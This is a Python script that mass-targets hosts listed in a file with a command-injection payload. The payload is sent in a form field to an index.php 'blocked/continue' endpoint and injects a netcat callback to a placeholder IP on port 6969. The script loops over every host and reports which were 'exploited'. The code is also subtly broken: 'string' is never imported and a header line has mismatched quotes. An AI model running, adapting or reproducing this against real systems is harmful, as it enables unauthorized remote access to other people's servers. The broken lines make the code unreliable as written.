import requests
import random
import base64
import socket
import time

url_file = 'urls.txt'

def exploit(host):
    payload = f"$(echo -n \"';nc x.x.x.x 6969 #'\" | base64)"
    data = {
        'args_reason': 'filetypewarn',
        'url': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'filetype': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'user': ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)),
        'user_encoded': payload
    }

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent': 'curl/8.0.1"
        
    }

    try:
        response = requests.post(f'https://{host}/index.php?c=blocked&action=continue', headers=headers, data=data, verify=False, timeout=30)
        if response.status_code == 200:
            print(f'Host {host} has been exploited')
        else:
            print(f'Exploit unsuccessful on host {host}, status code {response.status_code}')
    except requests.exceptions.Timeout:
        print(f'Timeout on host {host}, moving on to next host')
    except requests.exceptions.RequestException as e:
        print(f'Error on host {host}: {e}')

def main():
    with open(url_file, 'r') as f:
        for line in f:
            host = line.strip()
            print(f'Exploiting host {host}')
            exploit(host)
            time.sleep(1)

if __name__ == '__main__':
    main()